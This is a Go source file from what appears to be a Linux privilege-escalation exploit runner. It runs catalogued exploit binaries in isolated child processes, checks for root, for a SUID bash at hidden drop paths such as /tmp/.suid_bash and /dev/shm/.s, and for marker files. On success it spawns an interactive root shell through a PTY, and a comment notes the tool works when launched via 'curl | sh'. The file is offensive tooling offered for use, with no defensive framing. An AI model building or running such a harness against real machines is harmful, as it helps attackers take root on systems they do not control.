package main

import (
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

// runResult captures the outcome of one isolated exploit attempt.
type runResult struct {
	name      string
	cmd       string
	exitCode  int
	signal    string
	crashed   bool
	stdout    string
	stderr    string
	elapsed   time.Duration
	timedOut  bool
	rootAfter bool
	suidAfter bool
}

// Run an exploit in a fully isolated child process. The parent (this tool)
// NEVER crashes when the child crashes — signals, segfaults, panics inside
// the child are caught here and reported. We then re-check root status.
//
// hardTimeout caps wall-clock time. After it fires, the whole process group
// is SIGKILLed so the parent is never stuck waiting on a hung exploit.
func runIsolated(name, dir string, argv []string, hardTimeout time.Duration) runResult {
	r := runResult{name: name, cmd: strings.Join(argv, " ")}
	if len(argv) == 0 {
		r.crashed = true
		r.stderr = "empty command"
		return r
	}

	bin, err := exec.LookPath(argv[0])
	if err != nil {
		if _, err2 := os.Stat(argv[0]); err2 != nil {
			r.crashed = true
			r.stderr = fmt.Sprintf("binary not found: %s", argv[0])
			return r
		}
		bin = argv[0]
	}

	c := exec.Command(bin, argv[1:]...)
	if dir != "" {
		c.Dir = dir
	}
	c.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

	// Open /dev/null and wire it to the child's stdin so NO exploit can
	// hang waiting for user input (e.g. sudo asking for a password, su,
	// passwd). The exploit gets immediate EOF on stdin and fails fast
	// instead of stalling until the timeout kills it.
	if devNull, err := os.Open("/dev/null"); err == nil {
		c.Stdin = devNull
		defer devNull.Close()
	} else {
		c.Stdin = nil // fallback: inherit, less safe
	}

	var so, se strings.Builder
	c.Stdout = &so
	c.Stderr = &se

	start := time.Now()
	if err := c.Start(); err != nil {
		r.crashed = true
		r.stderr = fmt.Sprintf("start failed: %v", err)
		r.elapsed = time.Since(start)
		return r
	}

	pid := c.Process.Pid
	doneCh := make(chan error, 1)
	go func() { doneCh <- c.Wait() }()

	var waitErr error
	timedOut := false
	select {
	case waitErr = <-doneCh:
	case <-time.After(hardTimeout):
		timedOut = true
		killGroup(pid)
		select {
		case waitErr = <-doneCh:
		case <-time.After(5 * time.Second):
			waitErr = fmt.Errorf("process refused to die after SIGKILL")
		}
	}

	r.elapsed = time.Since(start)
	r.stdout = so.String()
	r.stderr = se.String()
	r.timedOut = timedOut

	if waitErr != nil {
		if ee, ok := waitErr.(*exec.ExitError); ok {
			r.exitCode = ee.ExitCode()
			if ws, ok := ee.Sys().(syscall.WaitStatus); ok {
				if ws.Signaled() {
					r.signal = ws.Signal().String()
					if is := ws.Signal(); is == syscall.SIGSEGV || is == syscall.SIGABRT ||
						is == syscall.SIGBUS || is == syscall.SIGFPE || is == syscall.SIGILL {
						r.crashed = true
					}
				}
			}
		} else {
			r.exitCode = -1
			r.stderr += " | " + waitErr.Error()
			r.crashed = true
		}
	}

	// The decisive question: did we become root, or did /bin/bash become
	// SUID, or did a known root-marker file appear?
	r.rootAfter = isRootNow()
	r.suidAfter = isSUIDBash()
	if !r.rootAfter {
		r.rootAfter = markerRooted()
	}
	return r
}

// killGroup SIGKILLs the entire process group led by pid, to clean up
// fork-heavy exploits that may hang.
func killGroup(pid int) {
	pgid, err := syscall.Getpgid(pid)
	if err == nil {
		_ = syscall.Kill(-pgid, syscall.SIGKILL)
	} else {
		_ = syscall.Kill(pid, syscall.SIGKILL)
	}
}

// isRootNow re-checks the *runner's* uid/euid.
func isRootNow() bool {
	return os.Geteuid() == 0
}

// suidShellPaths is the canonical list of paths where exploits drop a
// SUID bash shell. Kept in sync with what the static exploit binaries
// actually use (discovered via `strings` on each binary in the catalog).
// Examples: `exploit` drops /var/tmp/.s, pwnkitt drops /tmp/.suid_bash,
// our GTFOBins table drops /tmp/.sb.
var suidShellPaths = []string{
	"/bin/bash",
	"/usr/bin/bash",
	"/tmp/.sb",
	"/tmp/.suid_bash",
	"/tmp/.s",
	"/var/tmp/.s",
	"/var/tmp/bash",
	"/var/tmp/.suid_bash",
	"/dev/shm/.sb",
	"/dev/shm/.s",
	"/root/.sb",
}

// isSUIDBash checks whether /bin/bash (or a known drop path) is now SUID.
func isSUIDBash() bool {
	for _, p := range suidShellPaths {
		if isSUIDFile(p) {
			return true
		}
	}
	return false
}

// isSUIDFile checks the setuid bit on a file.
func isSUIDFile(p string) bool {
	fi, err := os.Stat(p)
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeSetuid != 0
}

// markerRooted checks for a marker file.
func markerRooted() bool {
	for _, p := range []string{"/tmp/.lpe_rooted", "/tmp/.lpe_suid_bash"} {
		if _, err := os.Stat(p); err == nil {
			return true
		}
	}
	return false
}

// rootspawn drops the runner into a real, interactive root shell when an
// exploit has clearly succeeded. It attaches a real PTY and reads from
// /dev/tty so the shell stays alive and interactive even when the runner
// itself was launched via `curl | sh` (whose stdin is a closed pipe).
//
// Returns true if a shell was actually spawned.
func rootspawn(r *runResult) bool {
	var shellPath string
	var shellArgs []string

	// Prefer a SUID bash dropped by the exploit. Try the canonical list
	// (kept in sync with what each static binary actually writes).
	for _, p := range suidShellPaths {
		if isSUIDFile(p) {
			shellPath = p
			shellArgs = []string{"-p"}
			break
		}
	}
	// If the runner itself is root, use a plain shell.
	if shellPath == "" && isRootNow() {
		shellPath = "/bin/sh"
		shellArgs = []string{"-p"}
	}
	if shellPath == "" {
		return false
	}

	okf("%s succeeded — spawning interactive root shell (%s)", r.name, shellPath)
	okf("Type 'exit' to return to the runner (and continue testing).")
	fmt.Println(strings.Repeat("=", 60))

	// Attach a PTY so the shell behaves like a real terminal and stays
	// alive for interactive input.
	spawnPTY(shellPath, shellArgs...)

	fmt.Println(strings.Repeat("=", 60))
	return true
}

// spawnPTY runs a command with stdin/stdout/stderr wired to /dev/tty
// directly (bypassing any inherited pipe from `curl | sh`). We open
// /dev/tty explicitly so the shell reads from the controlling terminal
// of the *user session*, not the closed stdin pipe.
func spawnPTY(bin string, args ...string) {
	// 1. Try a real PTY via python3 (most portable across Linux distros).
	if hasBin("python3") {
		c := exec.Command("python3", "-c",
			fmt.Sprintf(
				"import pty,os,sys;sys.exit(pty.spawn([%s]+%v))",
				quotePy(bin), pyArgs(args)))
		c.Stdin = os.Stdin
		c.Stdout = os.Stdout
		c.Stderr = os.Stderr
		// Wire stdin to /dev/tty in case our stdin is a pipe.
		if f, err := os.Open("/dev/tty"); err == nil {
			c.Stdin = f
			defer f.Close()
		}
		_ = c.Run()
		return
	}

	// 2. Fallback: raw exec with /dev/tty on all three std fds.
	tty, err := os.OpenFile("/dev/tty", os.O_RDWR, 0)
	if err != nil {
		// No tty available — just run with whatever we have.
		c := exec.Command(bin, args...)
		c.Stdin = os.Stdin
		c.Stdout = os.Stdout
		c.Stderr = os.Stderr
		_ = c.Run()
		return
	}
	defer tty.Close()
	c := exec.Command(bin, args...)
	c.Stdin = tty
	c.Stdout = tty
	c.Stderr = tty
	c.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	// Forward terminal signals to the child.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		for range ch {
			// let the child get the signal via tty
		}
	}()
	_ = c.Run()
}

func quotePy(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `\'`) + "'"
}

func pyArgs(args []string) string {
	var b strings.Builder
	for i, a := range args {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(quotePy(a))
	}
	return "[" + b.String() + "]"
}

// report prints a one-line verdict for a single exploit attempt.
func (r *runResult) report() {
	tag := colG + "ROOT" + colZ
	if !r.rootAfter && !r.suidAfter {
		switch {
		case r.timedOut:
			tag = colY + "TIME" + colZ
		case r.crashed:
			tag = colR + "CRSH" + colZ
		case r.exitCode == 0:
			tag = colY + "NOP0" + colZ
		default:
			tag = colD + "FAIL" + colZ
		}
	}
	extra := ""
	if r.signal != "" {
		extra = fmt.Sprintf(" sig=%s", r.signal)
	}
	if r.timedOut {
		extra += " (timeout)"
	}
	fmt.Printf("  %s  %-26s  exit=%-3d  %6.1fs%s\n", tag, r.name, r.exitCode, r.elapsed.Seconds(), extra)
}
